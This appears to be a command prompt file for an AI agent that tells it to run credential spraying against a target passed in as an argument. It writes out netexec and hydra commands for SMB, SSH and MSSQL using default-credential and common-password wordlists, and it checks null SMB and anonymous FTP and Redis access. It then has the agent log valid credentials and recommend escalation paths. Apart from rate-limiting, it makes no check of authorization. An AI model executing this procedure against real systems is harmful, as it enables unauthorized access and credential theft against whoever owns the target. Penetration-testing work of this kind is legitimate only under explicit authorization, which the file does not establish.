Run credential spraying against $ARGUMENTS

## Steps
1. Identify authentication services on target (SSH, SMB, RDP, FTP, databases, web logins)
2. Test default credentials from hunter/wordlists/service-default-creds.txt:
   - For each service:user:password combo, attempt authentication
   - netexec smb $ARGUMENTS -u USER -p PASS (for SMB)
   - netexec ssh $ARGUMENTS -u USER -p PASS (for SSH)
   - netexec mssql $ARGUMENTS -u USER -p PASS (for MSSQL)
3. Spray common credentials from hunter/wordlists/common-users.txt + common-passwords.txt:
   - hydra -L hunter/wordlists/common-users.txt -P hunter/wordlists/common-passwords.txt $ARGUMENTS SERVICE -t 4
   - Rate-limit to 4 threads max to avoid lockouts
4. Test null/anonymous access:
   - smbclient -L //$ARGUMENTS -N (null SMB session)
   - FTP anonymous login
   - Redis unauthenticated access
5. Log all successful authentications to reports/raw/valid-creds.txt
6. For each valid credential, test access scope and privilege level
7. Compile results into reports/cred-spray-summary.md

Report valid credentials found, access level per credential, and recommended escalation paths.

**IMPORTANT:** Rate-limit all spraying. Never lock out accounts. Use -t 4 max for hydra.
